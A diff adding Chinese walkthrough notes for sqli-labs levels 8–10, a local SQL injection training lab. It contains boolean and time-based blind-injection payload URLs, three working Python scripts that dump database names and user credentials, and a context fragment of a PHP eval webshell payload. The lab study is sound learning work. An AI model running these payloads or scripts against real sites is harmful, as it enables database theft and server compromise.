@@ -173,3 +173,307 @@ http://localhost/sqli-labs/Less-7/?id=1')) union select null,null,'<?php @eval($
 
 ![image-20210513220212340](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210513220212340.png)
 
+## 第八关
+
+报错注入和普通语句错误都不回显错误信息，语法输入正确只是显示you are in……
+
+看来是需要用盲注了，时间盲注或者布尔盲注。弄个脚本爆破试试
+
+**盲注需要掌握一些mysql的相关函数：**
+
+> length(str): 返回str字符串的长度
+>
+> substr(str,pos,len): 将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是										数组的0开始
+>
+> mid(str,pos,len): 跟上面的substr一样，截取字符串
+>
+> ascii(str): 返回字符串str的最左面字符的ASCII码
+>
+> ord(str): 同上，返回ASCII码
+>
+> if(a,b,c): a为条件，a为true，返回b,否则返回c，如if(1>2,1,0)这个式子返回0
+>
+> 需要我们要记得常见的ASCII，A:65,Z:90,a:97,z:122,0:48,9:57:a
+>
+> 
+
+首先 `select database()`查询数据库
+
+ascii(substr((select database()),1,1)): 返回数据库名称的第一个字母，转化为ASCII码
+
+ascii(substr((select database()),1,1))>64：ascii大于64就返回true，if就返回1，否则返回0
+
+payload：
+
+~~~http
+http://localhost/sqli-labs/Less-8/?id=1' and if(ascii(substr((select database()),1,1))>64,sleep(5),1)%23 
+~~~
+
+python GET布尔盲注脚本：
+
+~~~python
+import sys
+import requests
+
+def getPayload(result_index, char_index, ascii):
+    # 附加url
+    start_str = "1' and "
+    end_str = "--+"
+    # 自定义SQL查询语句
+    # 查询所有数据库名
+    # select_str="select schema_name from information_schema.schemata limit "+ str(result_index) + ",1"
+    # 查询特定数据库中的所有表名
+    # select_str="select table_name from information_schema.tables where table_schema='security' limit "+str(result_index)+",1"
+    # 查询数据库的表的列名
+    # select_str= "select column_name from information_schema.columns where table_name ='users' and table_schema='security' limit " + str(result_index) + ",1"
+    # 查询特定数据库特定表中内容
+    select_str="select concat(username,0x7e,password) from users limit "+str(result_index)+",1"
+    # 连接payload
+    sqli_str = "(ascii(mid((" + select_str + ")," + str(char_index) + ",1))>" + str(ascii) + ")"
+    payload = start_str + sqli_str + end_str
+    # print(payload)
+    return payload
+
+
+def execute(result_index, char_index, ascii):
+    # 连接url
+    url = "http://localhost:/sqli-labs/Less-8/?id="
+    exec_url = url + getPayload(result_index, char_index, ascii)
+    # print(exec_url)
+    # 检查回显
+    echo = "You are in"
+    content = requests.get(exec_url).text
+    if echo in content:
+        return True
+    else:
+        return False
+
+
+def dichotomy(result_index, char_index, left, right):
+    while left < right:
+        # 二分法
+        ascii = int((left + right) / 2)
+        if execute(str(result_index), str(char_index + 1), str(ascii)):
+            left = ascii
+        else:
+            right = ascii
+        # 结束二分
+        if left == right - 1:
+            if execute(str(result_index), str(char_index + 1), str(ascii)):
+                ascii += 1
+                break
+            else:
+                break
+    return chr(ascii)
+
+
+if __name__ == "__main__":
+    for num in range(32):  # 查询结果的数量
+        count = 0
+        for len in range(32):  # 单条查询结果的长度
+            count += 1
+            char = dichotomy(num, len, 30, 126)
+            if ord(char) == 31:  # 单条查询结果已被遍历
+                break
+            sys.stdout.write(char)
+            sys.stdout.flush()
+        if count == 1:  # 查询结果已被遍历
+            break
+        sys.stdout.write("\r\n")
+        sys.stdout.flush()
+
+~~~
+
+[更多脚本代码（get时间盲注、post布尔盲注、post时间盲注）](https://blog.csdn.net/south_layout/article/details/105964155)
+
+成功爆出用户名和密码
+
+![image-20210517203014403](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210517203014403.png)
+
+## 第九关
+
+这一关无论输入什么特殊字符，出现语法错误和正常SQL语句返回的页面都是一样的，看看源码显示，限制了正确结果与错误结果返回的页面一致，看来不能使用布尔盲注了，要使用时间盲注。
+
+![image-20210517203434270](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210517203434270.png)
+
+接下来，学习基于时间型SQL盲注。
+
+我们在这里使用if（查询语句，1，sleep（5）），即如果我们的查询语句为真，那么直接返回结果；如果我们的查询语句为假，那么过5秒之后返回页面。所以我们就根据返回页面的时间长短来判断我们的查询语句是否执行正确，即我们的出发点就回到了之前的基于布尔的SQL盲注，也就是构造查询语句来判断结果是否为真。
+
+**先判断能不能基于时间盲注来展开注入错误的语句** **等了5秒才返回的** **能基于时间的错误进行盲注**
+
+~~~
+http://127.0.0.1/sqli-labs/Less-9/?id=1%27%20and%20sleep(5)%20%23
+~~~
+
+成功执行语句，页面加载了5秒，说明注入语句成功，接下来就是爆破数据库名、表名、列名、数据库信息。
+
+**时间盲注脚本，准确度不太满意，由于时间网页延迟的问题，多换几个时间就可以了**
+
+```python
+import sys
+import time
+import requests
+
+
+def getPayload(result_index, char_index, ascii):
+    # 附加url
+    start_str = "1' and "
+    end_str = "--+"
+    # 自定义SQL查询语句
+    # 查询所有数据库名
+    select_str="select schema_name from information_schema.schemata limit "+ str(result_index) + ",1"
+    # 查询特定数据库中的所有表名
+    # select_str="select table_name from information_schema.tables where table_schema='security' limit "+str(result_index)+",1"
+    # 查询数据库的表的列名
+    # select_str= "select column_name from information_schema.columns where table_name ='users' and table_schema='security' limit " + str(result_index) + ",1"
+    # 查询特定数据库特定表中内容
+    # select_str = "select concat(username,0x7e,password) from users limit " + str(result_index) + ",1"
+    # 连接payload
+    sqli_str = "if(ascii(mid((" + select_str + ")," + str(char_index) + ",1))=" + str(ascii) + ",sleep(0.2),0)"
+
+    payload = start_str + sqli_str + end_str
+    # print(payload)
+    return payload
+
+
+def execute(result_index, char_index, ascii):
+    # 连接url
+    url = "http://localhost/sqli-labs/Less-9/?id="
+    exec_url = url + getPayload(result_index, char_index, ascii)
+    # print(exec_url)
+    # 检查延时
+    before_time = time.time()
+    requests.get(exec_url)  # 节约时间
+    after_time = time.time()
+    use_time = after_time - before_time
+    if use_time >= 0.05:
+        return True
+    else:
+        return False
+
+
+def exhaustive(result_index, char_index):
+    # ascii可显字符从32到126共95个 按可能性顺序
+    ascii_list = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
+                  'u', 'v', 'w', 'x', 'y', 'z', '_', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
+                  'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', ' ', '!', '"', '#', '$', '%', '&',
+                  '\'', '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':',
+                  ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '`', '{', '|', '}', '~']
+    for ascii_char in ascii_list:
+        ascii = ord(ascii_char)
+        if execute(str(result_index), str(char_index + 1), str(ascii)):
+            return ascii_char
+    return chr(1)
+
+
+if __name__ == "__main__":
+    for num in range(32):  # 查询结果的数量
+        count = 0
+        for len in range(32):  # 单条查询结果的长度
+            count += 1
+            char = exhaustive(num, len)
+            if ord(char) == 1:  # 单条查询结果已被遍历
+                break
+            sys.stdout.write(char)
+            sys.stdout.flush()
+        if count == 1:  # 查询结果已被遍历
+            break
+        sys.stdout.write("\r\n")
+        sys.stdout.flush()
+```
+
+![image-20210517211032100](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210517211032100.png)
+
+## 第十关
+
+和第九关一样，错误输入和正确输入的页面信息显示一样。先用时间盲注找出是字符型注入还是数字型注入，最终确定是双引号字符型注入
+
+payload：
+
+~~~
+http://127.0.0.1/sqli-labs/Less-10?id=1" and sleep(3)%23  //页面会加载3秒，证明是双引号注入
+~~~
+
+开始直接运行时间盲注的python脚本吧,在上一关的脚本的基础上，修改一下`start_str`字段即可
+
+~~~python
+import sys
+import time
+import requests
+
+
+def getPayload(result_index, char_index, ascii):
+    # 附加url
+    start_str = '1" and '
+    end_str = "--+"
+    # 自定义SQL查询语句
+    # 查询所有数据库名
+    select_str="select schema_name from information_schema.schemata limit "+ str(result_index) + ",1"
+    # 查询特定数据库中的所有表名
+    # select_str="select table_name from information_schema.tables where table_schema='security' limit "+str(result_index)+",1"
+    # 查询数据库的表的列名
+    # select_str= "select column_name from information_schema.columns where table_name ='users' and table_schema='security' limit " + str(result_index) + ",1"
+    # 查询特定数据库特定表中内容
+    # select_str = "select concat(username,0x7e,password) from users limit " + str(result_index) + ",1"
+    # 连接payload
+    sqli_str = "if(ascii(mid((" + select_str + ")," + str(char_index) + ",1))=" + str(ascii) + ",sleep(0.1),0)"
+
+    payload = start_str + sqli_str + end_str
+    # print(payload)
+    return payload
+
+
+def execute(result_index, char_index, ascii):
+    # 连接url
+    url = "http://localhost/sqli-labs/Less-10/?id="
+    exec_url = url + getPayload(result_index, char_index, ascii)
+    # print(exec_url)
+    # 检查延时
+    before_time = time.time()
+    requests.get(exec_url)  # 节约时间
+    after_time = time.time()
+    use_time = after_time - before_time
+    if use_time >= 0.09:
+        return True
+    else:
+        return False
+
+
+def exhaustive(result_index, char_index):
+    # ascii可显字符从32到126共95个 按可能性顺序
+    ascii_list = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
+                  'u', 'v', 'w', 'x', 'y', 'z', '_', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
+                  'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', ' ', '!', '"', '#', '$', '%', '&',
+                  '\'', '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':',
+                  ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '`', '{', '|', '}', '~']
+    for ascii_char in ascii_list:
+        ascii = ord(ascii_char)
+        if execute(str(result_index), str(char_index + 1), str(ascii)):
+            return ascii_char
+    return chr(1)
+
+
+if __name__ == "__main__":
+    for num in range(32):  # 查询结果的数量
+        count = 0
+        for len in range(32):  # 单条查询结果的长度
+            count += 1
+            char = exhaustive(num, len)
+            if ord(char) == 1:  # 单条查询结果已被遍历
+                break
+            sys.stdout.write(char)
+            sys.stdout.flush()
+        if count == 1:  # 查询结果已被遍历
+            break
+        sys.stdout.write("\r\n")
+        sys.stdout.flush()
+
+~~~
+
+![image-20210517212451407](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210517212451407.png)
+
+准确率还是很差
+
+## 第十一关
+
